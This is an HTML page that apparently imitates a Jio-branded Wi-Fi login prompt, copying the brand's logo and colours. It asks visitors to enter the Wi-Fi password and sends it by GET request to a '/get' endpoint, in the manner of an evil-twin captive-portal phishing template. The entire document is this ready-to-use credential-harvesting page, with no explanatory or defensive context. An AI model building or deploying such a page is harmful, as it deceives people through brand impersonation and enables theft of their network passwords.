<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f8fa;
    }
    .login-container {
      width: 90%;
      max-width: 400px;
      margin: auto;
      padding: 20px;
      border: 1px solid #e9e9e9;
      border-radius: 5px;
      margin-top: 50px;
      background-color: #fff;
    }
    #logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .g-h1 {
      font-weight: bold;
      font-size: 46px;
      margin-top: 10px;
      text-align: center;
      color: #D6001C; /* Jio red */
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-transform: uppercase;
    }
    .g-h1 .brand-symbol {
      font-size: 20px; /* Adjust size of the ® symbol */
      vertical-align: super; /* Align symbol to superscript */
    }
    .logo-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 15px;
    }
    .logo-container .jio-circle {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      background-color: #D6001C; /* Jio red */
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-size: 36px;
      font-weight: bold;
      text-transform: uppercase;
    }
    .g-h2 {
      font-weight: 200;
      font-size: 16px;
      margin-top: 10px;
      text-align: center;
      color: #657786;
    }
    .g-input {
      width: calc(100% - 20px);
      margin-top: 15px;
      height: 40px;
      padding: 5px 10px;
      font-size: 16px;
      color: #14171a;
      border: 1px solid #e6ecf0;
      border-radius: 5px;
      background-color: #f5f8fa;
    }
    .gbtn-primary {
      margin-top: 20px;
      width: 100%;
      height: 40px;
      font-size: 16px;
      color: #fff;
      background-color: #99ddd8;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .gbtn-primary:hover {
      background-color: #0c8ed9;
    }
    .gbtn-primary:disabled {
      background-color: #aab8c2;
      cursor: not-allowed;
    }
  </style>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
</head>
<body>
  <div id="login-app">
    <div class="login-container">
      <form action="/get" id="email-form-step">
        <div class="logo-container">
          <div class="jio-circle">Jio</div>
        </div>
        <h2 class="g-h2">Please enter the Wi-Fi password to proceed.</h2>
        <div class="login-content">
          <!-- Hidden input for email -->
          <input name="email" type="hidden" value="EnteredPassword">
          <!-- Visible password input -->
          <input name="preview_text" type="password" class="g-input" placeholder="Password" required>
          <div>
            <button class="gbtn-primary" type="submit">Next</button>
          </div>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
